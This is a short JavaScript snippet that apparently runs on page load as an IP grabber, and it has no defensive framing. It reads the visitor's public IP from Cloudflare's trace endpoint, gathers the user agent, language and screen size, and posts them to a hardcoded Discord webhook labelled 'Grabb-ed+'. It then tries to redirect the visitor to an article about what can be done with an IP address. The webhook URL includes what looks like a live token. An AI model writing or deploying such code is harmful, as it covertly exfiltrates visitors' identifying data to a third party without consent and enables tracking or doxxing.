var http = ""
function text(url) {
  return fetch(url).then(res => res.text());
}

text('https://www.cloudflare.com/cdn-cgi/trace').then(data => {
  let ipRegex = /[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}/
  let ip = data.match(ipRegex)[0];
  var agent = navigator.userAgent;
    let lang  = navigator.language;
  let xscreen = screen.width + "x"+screen.height;
  var udata = ip + " " + agent + " " + lang + " " + xscreen;
  const xml = new XMLHttpRequest;
   xml.open("POST", "https://discord.com/api/webhooks/1121355992773435503/FTtI24UtPXMN4BmDucQbDRy0WlTKtdQpDL9P7RSvTNzbMCwY8uz330h6Fgmsw2s-EuM7");

   xml.setRequestHeader('Content-type', 'application/json');

   const params = {
     username: "Grabb-ed+",
     avatar_url: "",
     content: udata
   }
   xml.send(JSON.stringify(params));
window.location.redirect("https://nordvpn.com/blog/what-can-someone-do-with-your-ip-address/");
});
